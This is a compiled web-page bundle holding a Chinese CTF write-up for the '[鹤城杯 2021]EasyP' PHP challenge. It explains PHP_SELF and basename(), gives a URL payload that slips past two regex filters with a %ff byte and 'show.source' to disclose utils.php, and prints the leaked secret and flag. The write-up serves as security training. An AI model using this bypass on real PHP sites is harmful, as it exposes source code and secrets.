import{_ as p,r as o,o as c,c as l,a as n,b as s,d as e,e as t}from"./app-81cf5d26.js";const i={},u=t(`<p>#PHP</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">&#39;utils.php&#39;</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;guess&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;guess&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$guess</span> <span class="token operator">===</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;Congratulations! The flag is: &#39;</span> <span class="token operator">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;Wrong. Try Again&#39;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/utils\\.php\\/*$/i&#39;</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;PHP_SELF&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;hacker :)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/show_source/&#39;</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;REQUEST_URI&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;hacker :)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;show_source&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;PHP_SELF&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>开始的 <code>$secret</code> 无从得知</p>`,3),r=n("code",null,"$_SERVER",-1),d=n("code",null,"$_SERVER",-1),k=n("code",null,"PHP_SELF",-1),v=n("code",null,"REQUEST_URI",-1),g=n("code",null,"/index.html",-1),b={href:"https://www.php.net/manual/zh/reserved.variables.server.php",target:"_blank",rel:"noopener noreferrer"},h={href:"https://www.php.net/manual/zh/function.basename.php",target:"_blank",rel:"noopener noreferrer"},m=t(`<p>第一个正则 : 匹配 <code>utils.php/</code> 后面加任意字符，用非 ASCII 字符绕过 第二个正则 : 匹配 <code>show_source</code> 可以考虑用 加号（<code>+</code>） 左中括号（<code>[</code>） 空格（<code></code>） 点号（<code>.</code>）绕过</p><p>因为原本页面时<code>index.php</code></p><p>所以最终 payload：</p><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token path">index.php<span class="token path-separator">/</span>utils.php<span class="token path-separator">/</span>%ff</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">show.source</span>=<span class="token value">1</span></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>\`<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;nssctfrtdfgvhbjdas&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;NSSCTF{70cead77-6ae5-4e6e-b998-afce675a92ac}&#39;</span><span class="token punctuation">;</span>   \`
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5),_={href:"https://blog.csdn.net/qq_62046696/article/details/124749646",target:"_blank",rel:"noopener noreferrer"};function f(E,q){const a=o("ExternalLinkIcon");return c(),l("div",null,[u,n("p",null,[r,s(" : "),d,s("  是一个包含了诸如头信息（header）、路径（path）、以及脚本位置（script locations）等信息的  array。 "),k,s(" : 当前执行脚本的文件名 "),v,s(" : URI 用来指定要访问的页面。例如 “"),g,s("” 详见 "),n("a",b,[s("PHP: $_SERVER - Manual"),e(a)])]),n("p",null,[s("basename — 返回路径中的文件名部分 详见 "),n("a",h,[s("PHP: basename - Manual"),e(a)])]),m,n("p",null,[s("参考链接： "),n("a",_,[s("[鹤城杯 2021]EasyP_偶尔躲躲乌云 334 的博客-CSDN 博客"),e(a)])])])}const y=p(i,[["render",f],["__file","EasyP.html.vue"]]);export{y as default};
